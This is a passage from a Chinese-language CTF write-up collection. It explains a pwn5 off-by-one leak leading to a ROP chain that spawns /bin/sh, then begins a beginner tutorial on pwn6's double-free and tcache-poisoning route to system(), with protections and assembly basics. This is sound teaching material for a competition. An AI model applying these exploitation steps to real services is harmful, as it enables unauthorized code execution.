(2) APPEND#1 ─ L=0x101（CRC 強制 =0xff）
                 │  寫 0x101 bytes → state[0x100] = 0xff
                 │  capacity: 0x0100 → 0x01ff   ✶ off-by-one
                 ▼
(3) SEND STATE ─ send_frame(0, state, 0x1ff)
                 │  洩漏 state[0..0x1fe]
                 ├─ state[0x108] = stack canary
                 ├─ state[0x110] = saved rbp（判斷 16-byte 對齊）
                 └─ state[0x118] = PIE + 0x1a9f  →  PIE_base = 值 - 0x1a9f
                 ▼
(4) APPEND#2 ─ L=0x200（n=0x1ff ≤ capacity 0x1ff）
                 │  寫 0x200 bytes：
                 │  state[0x108] = canary（原樣寫回，否則 __stack_chk_fail）
                 │  state[0x110] = saved rbp（原值）
                 │  state[0x118] = ret                    ← 劫持
                 │  state[0x120] = pop rdi; ret / "/bin/sh" / system@plt
                 └  .bss:0x4a54 = "/bin/sh\0"
                 ▼
(5) EJECT  ─ 離開迴圈 → 0x1865 epilogue 金絲雀檢查通過 → leave; ret
                 ▼
            ROP: ret（對齊）→ pop rdi; ret → "/bin/sh" → system@plt
                 ▼
              /bin/sh（繼承 socket 的 stdin/stdout）
                 ▼
            cat flag.txt → sun{...}
\end{Verbatim}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{11.
常見坑（血淚清單）}\label{ux5e38ux898bux5751ux8840ux6ddaux6e05ux55ae}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{\texttt{process()} 的 stdout 預設是 PTY（不是 pipe），但 stdin
  預設是 pipe}： pwntools 的
  \texttt{process(\textquotesingle{}\allowbreak{}./\allowbreak{}homemaker\textquotesingle{}\allowbreak{})} 等於
  \texttt{stdin=PIPE,\allowbreak{}\ \allowbreak{}stdout=PTY,\allowbreak{}\ \allowbreak{}stderr=STDOUT,\allowbreak{}\ \allowbreak{}raw=True}。 因為
  \texttt{raw=True}，PTY 會被設成 \textbf{raw mode}（不是
  canonical），所以二進位訊框其實送得進去、
  這題用預設值也能跑成功（實測過，\texttt{python3\ \allowbreak{}-\allowbreak{}c} 跑
  \texttt{process(\textquotesingle{}\allowbreak{}./\allowbreak{}homemaker\textquotesingle{}\allowbreak{})}
  一樣拿得到 flag）。 我們在 \texttt{exploit.\allowbreak{}py} 明寫
  \texttt{process(BIN,\allowbreak{}\ \allowbreak{}stdin=process.\allowbreak{}PIPE,\allowbreak{}\ \allowbreak{}stdout=process.\allowbreak{}PIPE)}
  只是為了：

  \begin{itemize}
  \tightlist
  \item
    讓 stdout 也走 pipe（輸出不會被 PTY
    的終端機行為影響，\texttt{recvuntil}/\texttt{recvrepeat}
    更可預期）；
  \item
    讓本機與遠端（本來就是 socket）的行為一致，少一個變數。
    \textbf{真正會卡住的情況是}：你在 shell 裡手動 \texttt{./\allowbreak{}homemaker}
    然後想用管線餵二進位訊框， 或用了 \texttt{stdin=process.\allowbreak{}PTY} 又沒關
    canonical mode------那時才需要處理「要按 Enter」的問題。
    （除錯小技巧：\texttt{ls\ \allowbreak{}-\allowbreak{}l\ \allowbreak{}/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}fd/\allowbreak{}0}
    看 stdin 到底是 pipe 還是 \texttt{/\allowbreak{}dev/\allowbreak{}pts/\allowbreak{}N}。 本題實測
    \texttt{fd0\ \allowbreak{}-\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}pipe:{[}…{]}}、\texttt{fd1\ \allowbreak{}-\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}/\allowbreak{}dev/\allowbreak{}pts/\allowbreak{}0}。）
  \end{itemize}
\item
  \textbf{\texttt{from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*}
  會吃掉命令列參數}：\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}REMOTE} 之後
  \texttt{sys.\allowbreak{}argv{[}1{]}} 就不見了 （\texttt{pwnlib.\allowbreak{}args}
  會把不認識的參數吃掉）→ \textbf{必須在 import 之前先讀
  \texttt{sys.\allowbreak{}argv}}。
\item
  \textbf{長度欄位是大端序，而 pwntools \texttt{p16()} 是小端序}： 我用
  \texttt{p16(len)} 送過 \texttt{1b\ \allowbreak{}5b\ \allowbreak{}05\ \allowbreak{}00\ \allowbreak{}…}，伺服器解讀成
  \texttt{L\ \allowbreak{}=\ \allowbreak{}0x0500}， 而
  \texttt{0x0500\ \allowbreak{}+\ \allowbreak{}7\ \allowbreak{}=\ \allowbreak{}0x507\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0x800}
  \textbf{通過了長度檢查} → 它開始等 1283
  bytes，整個卡死（連錯誤訊息都沒有）。
  \textbf{解法：\texttt{len(payload).\allowbreak{}to\_\allowbreak{}bytes(2,\allowbreak{}\ \allowbreak{}\textquotesingle{}\allowbreak{}big\textquotesingle{}\allowbreak{})}。}
  （除錯技巧：\texttt{cat\ \allowbreak{}/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}syscall}
  看它 \texttt{read(0,\allowbreak{}\ \allowbreak{}0x...\allowbreak{}486c,\allowbreak{}\ \allowbreak{}0x4fb)} 就能確認是讀長度問題。）
\item
  \textbf{\texttt{state{[}i{]}\ \allowbreak{}=\ \allowbreak{}payload{[}i+1{]}}}：append 從
  \texttt{payload+1} 開始複製，所以自己排 payload
  時\textbf{容易整體差一格}， 結果金絲雀沒對上 →
  \texttt{***\ \allowbreak{}stack\ \allowbreak{}smashing\ \allowbreak{}detected\ \allowbreak{}***}（SIGABRT）。
  建議：先用紙畫表（見 §7.3）或用 gdb 在 epilogue 檢查
  \texttt{{[}rbp-\allowbreak{}8{]}}。
\item
  \textbf{金絲雀必須「完整 8 bytes」寫回}：不要只補低位；且不要假設它是
  0x00 結尾就偷懶。
\item
  \textbf{16-byte 對齊}：\texttt{system}／libc 有些函式用
  \texttt{movaps}，\texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}!=\ \allowbreak{}8} 就 SIGSEGV。 記得在 chain
  前面補一個 \texttt{ret}（本題用洩漏到的 \texttt{saved\_\allowbreak{}rbp}
  動態判斷，最穩）。
\item
  \textbf{\texttt{/\allowbreak{}bin/\allowbreak{}sh} 要有 NUL
  結尾}，而且位址要指向\textbf{可讀且沒被覆蓋}的地方。 我們放在
  \texttt{.\allowbreak{}bss:\allowbreak{}0x4a54}，之後只再送一個 7-byte 的 EJECT 訊框（只覆寫
  \texttt{0x4860..\allowbreak{}0x4867}），所以安全。
\item
  \textbf{Full RELRO → 別浪費時間想 GOT 覆寫}；也別想改
  \texttt{.\allowbreak{}fini\_\allowbreak{}array}（同樣被 RELRO 保護成唯讀）。
\item
  \textbf{PIE 低位址}：\texttt{PIE\_\allowbreak{}base} 一定是 0x1000
  對齊；算出來不是整頁對齊就表示 offset 抄錯了。
\item
  \textbf{frame 長度上限}：\texttt{L\ \allowbreak{}+\ \allowbreak{}7\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0x800} →
  \texttt{L\ \allowbreak{}≤\ \allowbreak{}0x7f9}；想送更長的 payload 是行不通的（本題也用不到）。
\item
  \textbf{遠端/本地 libc 差異}：本機 Arch glibc \textbf{2.44}、遠端
  Ubuntu 22.04 glibc \textbf{2.35}，
  \texttt{system}、\texttt{pop\ \allowbreak{}rdi}、\texttt{"/\allowbreak{}bin/\allowbreak{}sh"} 的位移都不同 →
  \textbf{本題刻意只用 PIE 內部的 gadget 與自己寫的字串}， 完全不碰
  libc，所以兩邊都能打（這是很值得學的「libc-free ROP」技巧）。
\item
  \textbf{shell 結束後程式會 SIGSEGV}：chain 最後我們放 \texttt{0} 當
  \texttt{system} 的回傳位址， shell \texttt{exit} 之後就會崩潰 ------
  \textbf{這不影響拿 flag}（flag 已經印出來了）。要更優雅可以接
  \texttt{exit@plt}，但本題沒有 import \texttt{exit}。
\item
  \textbf{CRC 求解}：off-by-one 寫進去的 byte 正好是訊框
  CRC，不可自由選擇 → 要「反解」讓 CRC = 0xff。 本題用暴力枚舉 1 byte
  即可（256 次），因為 CRC 對單一 byte 是雙射。
\item
  \textbf{在錯的目錄執行}：\texttt{exploit.\allowbreak{}py} 用相對路徑
  \texttt{./\allowbreak{}homemaker}，所以一定要 \texttt{cd\ \allowbreak{}pwn5} 之後再跑 （在 repo
  根目錄跑會看到
  \texttt{{[}ERROR{]}\ \allowbreak{}\textquotesingle{}\allowbreak{}./\allowbreak{}homemaker\textquotesingle{}\allowbreak{}\ \allowbreak{}does\ \allowbreak{}not\ \allowbreak{}exist}）；或用
  \texttt{wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh\ \allowbreak{}pwn5}。
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{12.
附錄：檔案與指令速查}\label{ux9644ux9304ux6a94ux6848ux8207ux6307ux4ee4ux901fux67e5}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
檔案
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{exploit.\allowbreak{}py} & 最終
exploit：\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py}（本機）／\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}REMOTE}（遠端） \\
\texttt{FLAG.\allowbreak{}txt} & 真實遠端 flag \\
\texttt{notes.\allowbreak{}md} & 本文件 \\
\texttt{NOTES\_\allowbreak{}SUMMARY.\allowbreak{}txt} & 給上層 agent 的 30 行內摘要 \\
\texttt{disasm.\allowbreak{}txt} &
\texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}section=.\allowbreak{}text\ \allowbreak{}homemaker}
完整輸出 \\
\texttt{gdb\_\allowbreak{}evidence.\allowbreak{}sh} / \texttt{gdb\_\allowbreak{}evidence\_\allowbreak{}raw.\allowbreak{}txt} & 產生本文件
§5.3 證據的 gdb 腳本與原始輸出 \\
\texttt{gdb\_\allowbreak{}evidence.\allowbreak{}py} / \texttt{exploit\_\allowbreak{}input.\allowbreak{}bin} & 用 ASLR
關閉產生「固定位址」的輸入流，供 gdb 重播 \\
\texttt{remote\_\allowbreak{}run.\allowbreak{}txt} & 遠端成功輸出的原始紀錄 \\
\texttt{scratch\_\allowbreak{}leak.\allowbreak{}py} & 只做 leak 的最小範例（教學用） \\
\texttt{flag.\allowbreak{}txt} & 本機測試用的假 flag \\
\end{longtable}
}

常用指令：

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# 保護機制}
\ExtensionTok{pwn}\NormalTok{ checksec ./homemaker}
\CommentTok{\# 反組譯}
\ExtensionTok{objdump} \AttributeTok{{-}d} \AttributeTok{{-}M}\NormalTok{ intel }\AttributeTok{{-}{-}section}\OperatorTok{=}\NormalTok{.text ./homemaker}
\CommentTok{\# 找 gadget}
\ExtensionTok{ROPgadget} \AttributeTok{{-}{-}binary}\NormalTok{ ./homemaker }\KeywordTok{|} \FunctionTok{grep} \AttributeTok{{-}E} \StringTok{\textquotesingle{}pop rdi|: ret$\textquotesingle{}}
\CommentTok{\# 關掉 ASLR 跑（方便對位址）}
\ExtensionTok{setarch} \AttributeTok{{-}R}\NormalTok{ python3 exploit.py}
\CommentTok{\# 重現 gdb 證據}
\ExtensionTok{./gdb\_evidence.sh}
\CommentTok{\# 手動 gdb（PIE base = 0x555555554000）}
\FunctionTok{gdb} \AttributeTok{{-}q}\NormalTok{ ./homemaker }\AttributeTok{{-}ex} \StringTok{\textquotesingle{}b *0x555555554000+0x1a76\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}run\textquotesingle{}} \DataTypeTok{\textbackslash{}}
    \AttributeTok{{-}ex} \StringTok{\textquotesingle{}info registers rbp rsp\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/8gx $rbp{-}8\textquotesingle{}}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\paragraph{一句話總結}\label{ux4e00ux53e5ux8a71ux7e3dux7d50}

\begin{quote}
\texttt{APPEND} 的 off-by-one 把 16-bit 的 \texttt{capacity} 從
\texttt{0x100} 撐成 \texttt{0x1ff}， 於是 \texttt{SEND\ \allowbreak{}STATE}
意外洩漏了 canary / saved rbp / 回傳位址（拿到 PIE base）， 再用第二次
\texttt{APPEND} 把金絲雀原樣寫回、蓋掉回傳位址， 用
\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret}（藏在魔數 \texttt{0x1337c35f} 裡）＋
\texttt{system@plt} ＋ 自己放在 \texttt{.\allowbreak{}bss} 的 \texttt{"/\allowbreak{}bin/\allowbreak{}sh"} 拿到
shell。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\section{Part 7 --- pwn6 code\_breaker（Heap +
RPC）}\label{part-7-pwn6-code_breakerheap-rpc}

\begin{quote}
原始檔案：\texttt{pwn6/\allowbreak{}notes.\allowbreak{}md}
\end{quote}

\subsection{\texorpdfstring{SunshineCTF pwn6 --- \texttt{code\_\allowbreak{}breaker}
完整逆向與教學筆記}{SunshineCTF pwn6 --- code\_breaker 完整逆向與教學筆記}}\label{sunshinectf-pwn6-code_breaker-ux5b8cux6574ux9006ux5411ux8207ux6559ux5b78ux7b46ux8a18}

\begin{quote}
對象：\textbf{完全沒學過 ROP / pwn 的初學者} 所有位址、offset
都是本檔案用
\texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel\ \allowbreak{}code\_\allowbreak{}breaker}、\texttt{readelf}、\texttt{ROPgadget}、
以及實際跑 \texttt{gdb}/本機測試\textbf{驗證過的}，沒有半個是猜的。
檔名：\texttt{/\allowbreak{}home/\allowbreak{}kzzz/\allowbreak{}Documents/\allowbreak{}code/\allowbreak{}ctf/\allowbreak{}sunshine/\allowbreak{}pwn6/\allowbreak{}notes.\allowbreak{}md}

※ \textbf{完全沒學過 heap 的話}：先讀 \texttt{wp/\allowbreak{}99\_\allowbreak{}速查表.\allowbreak{}md}
§8（迷你版）與 \texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md} §5（完整版，含 gdb 實測的 heap
佈局表）， 或至少先看本檔 §3.5（把 chunk / bin / tcache / safe-linking
用 20 行講完）。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{0. 一句話總結}\label{ux4e00ux53e5ux8a71ux7e3dux7d50-1}

這是一個「自製加密 RPC 服務」的題目：

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  它會從 \texttt{/\allowbreak{}dev/\allowbreak{}urandom} 讀 16 bytes 當
  nonce，跟我們交換金鑰後，用一把\textbf{串流加密} 溝通（每個 byte 都用
  \texttt{S{[}(counter\ \allowbreak{}+\ \allowbreak{}i\ \allowbreak{}+\ \allowbreak{}K{[}i\&\allowbreak{}0xf{]})\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xff{]}} 去 XOR）。
\item
  它提供 7 個指令（0x10 \textasciitilde{}
  0x16），是一套「\textbf{堆積物件管理器}」：配置/讀/寫/釋放/複製（clone）。
\item
  「\textbf{複製（clone）時引用計數（refcount）算錯}」⇒ 同一塊 chunk
  會被 \texttt{free()} 兩次 ⇒ \textbf{double free + use-after-free}。
\item
  用 tcache poisoning 把「下一次 malloc 會回傳的位址」改成 \texttt{.\allowbreak{}bss}
  裡的函式指標 \texttt{{[}PIE+0x40c0{]}}，再把 \texttt{system@plt}
  寫進去。
\item
  指令 \texttt{0x15} 會執行 \texttt{call\ \allowbreak{}qword\ \allowbreak{}ptr\ \allowbreak{}{[}0x40c0{]}}，而
  \texttt{rdi} 正是我們送的字串 ⇒ 直接變成
  \texttt{system("cat\ \allowbreak{}flag.\allowbreak{}txt\ \allowbreak{}...")} ⇒ 得到 shell/旗標。
\end{enumerate}

\textbf{完全不需要 ROP chain}（但筆記第 5 節仍然從零教你
ROP/SROP，因為那是必備知識）。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{1.
題目資訊與保護機制}\label{ux984cux76eeux8cc7ux8a0aux8207ux4fddux8b77ux6a5fux5236}

\paragraph{1.1 檔案}\label{ux6a94ux6848}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
code_breaker          14640 bytes  ELF 64-bit LSB **pie** executable, x86-64, stripped
libc.so.6           2125328 bytes  GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.3)
ld-linux-x86-64.so.2  236616 bytes  對應的動態連結器
\end{Verbatim}

\texttt{readelf\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}code\_\allowbreak{}breaker}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 0x0000000000000001 (NEEDED)  Shared library: [libc.so.6]
 0x000000000000001d (RUNPATH) Library runpath: [$ORIGIN]     <-- 關鍵！
\end{Verbatim}

\paragraph{1.2 保護機制總表}\label{ux4fddux8b77ux6a5fux5236ux7e3dux8868}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
保護
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
有沒有
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
怎麼看出來
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
對解題的影響
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\textbf{PIE} & 有 & \texttt{readelf\ \allowbreak{}-\allowbreak{}h} →
\texttt{Type:\allowbreak{}\ \allowbreak{}DYN}，\texttt{Entry\ \allowbreak{}point\ \allowbreak{}0x12a0} &
程式碼/全域變數位址每次執行都不同，必須先 \textbf{leak PIE base} 才能算
\texttt{.\allowbreak{}bss}、\texttt{system@plt} 的位址 \\
\textbf{Canary} & 有 & \texttt{mov\ \allowbreak{}rax,\allowbreak{}\ \allowbreak{}qword\ \allowbreak{}ptr\ \allowbreak{}fs:\allowbreak{}0x28} +
\texttt{\_\allowbreak{}\_\allowbreak{}stack\_\allowbreak{}chk\_\allowbreak{}fail} & 想覆蓋 return address 就必須先洩漏
canary，否則 \texttt{\_\allowbreak{}\_\allowbreak{}stack\_\allowbreak{}chk\_\allowbreak{}fail} 會 abort \\
\textbf{NX} & 有 & \texttt{GNU\_\allowbreak{}STACK\ \allowbreak{}...\allowbreak{}\ \allowbreak{}RW}（沒有 E） &
堆疊不可執行，不能把 shellcode 放到 stack 上跑 → 要走 ROP / ret2libc
這條路 \\
\textbf{Partial RELRO} & 有 & \texttt{GNU\_\allowbreak{}RELRO\ \allowbreak{}0x3da8\ \allowbreak{}size\ \allowbreak{}0x258} →
只保護到 \texttt{0x4000}；\texttt{.\allowbreak{}got.\allowbreak{}plt} 在 \texttt{0x3fe8}，函式 GOT
在 \texttt{0x4000} 之後 & \texttt{.\allowbreak{}got.\allowbreak{}plt}（例如
\texttt{system@0x4028}）\textbf{可以寫}，可以 GOT overwrite \\
\textbf{ASLR} & 有 & 系統預設 & 所有 base 每次都不一樣，一樣要靠 leak \\
\textbf{SHSTK / IBT (CET)} & 標記有、\textbf{實際沒開} &
\texttt{.\allowbreak{}note.\allowbreak{}gnu.\allowbreak{}property:\allowbreak{}\ \allowbreak{}x86\ \allowbreak{}feature:\allowbreak{}\ \allowbreak{}IBT,\allowbreak{}\ \allowbreak{}SHSTK}，每個函式開頭與
PLT 都是 \texttt{endbr64} & 本題在一般 Linux
上沒有被強制啟用；而且我們跳去的 \texttt{system@plt} 開頭就是
\texttt{endbr64}，即使開了 IBT 也能過 \\
\textbf{glibc 版本} & 2.39 &
\texttt{strings\ \allowbreak{}libc.\allowbreak{}so.\allowbreak{}6\ \allowbreak{}\textbackslash{}\allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}grep\ \allowbreak{}\textquotesingle{}\allowbreak{}GNU\ \allowbreak{}C\ \allowbreak{}Library\textquotesingle{}\allowbreak{}}
& 有 \textbf{tcache}、有 \textbf{safe-linking}（指標會跟
\texttt{位址\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12} 做
XOR）、\texttt{tcache\_\allowbreak{}key} 是隨機值（不是指標）⇒ 影響 heap 攻擊手法 \\
\end{longtable}
}

\paragraph{1.3
怎麼執行它（重要！）}\label{ux600eux9ebcux57f7ux884cux5b83ux91cdux8981}

題目附了自己的 \texttt{libc.\allowbreak{}so.\allowbreak{}6}（2.39）跟
\texttt{ld-\allowbreak{}linux-\allowbreak{}x86-\allowbreak{}64.\allowbreak{}so.\allowbreak{}2}，但 ELF 的 interpreter 寫的是
\texttt{/\allowbreak{}lib64/\allowbreak{}ld-\allowbreak{}linux-\allowbreak{}x86-\allowbreak{}64.\allowbreak{}so.\allowbreak{}2}（系統的）。直接
\texttt{./\allowbreak{}code\_\allowbreak{}breaker} 會用系統 ld 去載入 題目的 libc，結果：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
./code_breaker: ./libc.so.6: undefined symbol: __nptl_change_stack_perm, version GLIBC_PRIVATE
\end{Verbatim}

因為 \textbf{ld 與 libc 是一對的，不能混搭}。正確跑法（也是 pwntools
用的）：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{process([}\StringTok{\textquotesingle{}./ld{-}linux{-}x86{-}64.so.2\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}{-}{-}library{-}path\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}./code\_breaker\textquotesingle{}}\NormalTok{])}
\end{Highlighting}
\end{Shaded}

（\texttt{RUNPATH=\$\allowbreak{}ORIGIN} 只是告訴程式去哪找
libc，\textbf{不能}改變「用哪個 ld」。）

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{2.
逐行組語解說（從零開始）}\label{ux9010ux884cux7d44ux8a9eux89e3ux8aaaux5f9eux96f6ux958bux59cb}

\paragraph{2.1 先認識 16
個通用暫存器}\label{ux5148ux8a8dux8b58-16-ux500bux901aux7528ux66abux5b58ux5668}

x86-64 有 16 個 64-bit 通用暫存器，寫法/用途：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
64-bit
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
低 32
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
低 16
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
低 8
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
傳統用途（System V AMD64 ABI）
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{rax} & \texttt{eax} & \texttt{ax} & \texttt{al} &
\textbf{函式回傳值}；syscall 編號；乘除法 \\
\texttt{rbx} & \texttt{ebx} & \texttt{bx} & \texttt{bl} &
被呼叫者保存（callee-saved），常當迴圈計數/指標 \\
\texttt{rcx} & \texttt{ecx} & \texttt{cx} & \texttt{cl} & 第 4
個參數；迴圈計數（\texttt{rep} 也用） \\
\texttt{rdx} & \texttt{edx} & \texttt{dx} & \texttt{dl} & 第 3
個參數；乘除法高位 \\
\texttt{rsi} & \texttt{esi} & \texttt{si} & \texttt{sil} & \textbf{第 2
個參數} \\
\texttt{rdi} & \texttt{edi} & \texttt{di} & \texttt{dil} & \textbf{第 1
個參數} \\
\texttt{rbp} & \texttt{ebp} & \texttt{bp} & \texttt{bpl} & frame
pointer（本題被當一般暫存器用） \\
\texttt{rsp} & \texttt{esp} & \texttt{sp} & \texttt{spl} &
\textbf{堆疊指標}（指向堆疊頂端） \\
\texttt{r8}\textasciitilde{}\texttt{r15} &
\texttt{r8d}\textasciitilde{}\texttt{r15d} &
\texttt{r8w}\textasciitilde{}\texttt{r15w} &
\texttt{r8b}\textasciitilde{}\texttt{r15b} & 第 5、6 個參數是
\texttt{r8}、\texttt{r9}，其餘 callee-saved \\
\end{longtable}
}

\begin{quote}
命名規則：\texttt{e} 開頭 = 32-bit，\texttt{r} 開頭 = 64-bit，\texttt{w}
= 16-bit，\texttt{b}/\texttt{l} = 8-bit。
\end{quote}

\paragraph{2.2 System V AMD64
呼叫慣例（本題大量依賴）}\label{system-v-amd64-ux547cux53ebux6163ux4f8bux672cux984cux5927ux91cfux4f9dux8cf4}

呼叫 \texttt{foo(a,\allowbreak{}\ \allowbreak{}b,\allowbreak{}\ \allowbreak{}c,\allowbreak{}\ \allowbreak{}d,\allowbreak{}\ \allowbreak{}e,\allowbreak{}\ \allowbreak{}f,\allowbreak{}\ \allowbreak{}g)} 時：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rdi = a , rsi = b , rdx = c , rcx = d , r8 = e , r9 = f , 第 7 個以後「從右往左」push 到 stack
回傳值放在 rax
\end{Verbatim}

而且 \textbf{\texttt{call} 會把返回位址 push 到 stack}，進入函式時
\texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}8}（所以函式一開頭通常 \texttt{push\ \allowbreak{}rbp}
讓它變 16 對齊）。這件事在第 5.4 節（\texttt{movaps} 崩潰）非常重要。

\paragraph{2.3
常用指令速查（本題真的會用到的）}\label{ux5e38ux7528ux6307ux4ee4ux901fux67e5ux672cux984cux771fux7684ux6703ux7528ux5230ux7684}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
指令
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
中文解釋
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{mov\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}src} & 複製（把 src 的值放到 dst） \\
\texttt{lea\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}{[}base+index*scale+disp{]}} &
\textbf{只做位址計算，不存記憶體}。常用 \texttt{lea\ \allowbreak{}rax,{[}rip+X{]}}
取「字串位址」，\texttt{lea\ \allowbreak{}eax,{[}r9-\allowbreak{}1{]}} 拿來做減法 \\
\texttt{add} / \texttt{sub} & 加 / 減 \\
\texttt{xor\ \allowbreak{}a,\allowbreak{}\ \allowbreak{}a} & 自己跟自己 XOR ⇒ 0（也是最短的「清零」寫法） \\
\texttt{cmp\ \allowbreak{}a,\allowbreak{}\ \allowbreak{}b} & 做 \texttt{a\ \allowbreak{}-\allowbreak{}\ \allowbreak{}b} 但只更新旗標（不存結果）→ 配
\texttt{je/\allowbreak{}jne/\allowbreak{}ja/\allowbreak{}jb/\allowbreak{}jg/\allowbreak{}jl} \\
\texttt{test\ \allowbreak{}a,\allowbreak{}\ \allowbreak{}b} & 做 AND 但只更新旗標 → \texttt{test\ \allowbreak{}rax,\allowbreak{}rax;\ \allowbreak{}js}
就是「rax 是負數嗎」 \\
\texttt{jmp} & 無條件跳 \\
\texttt{jcc} &
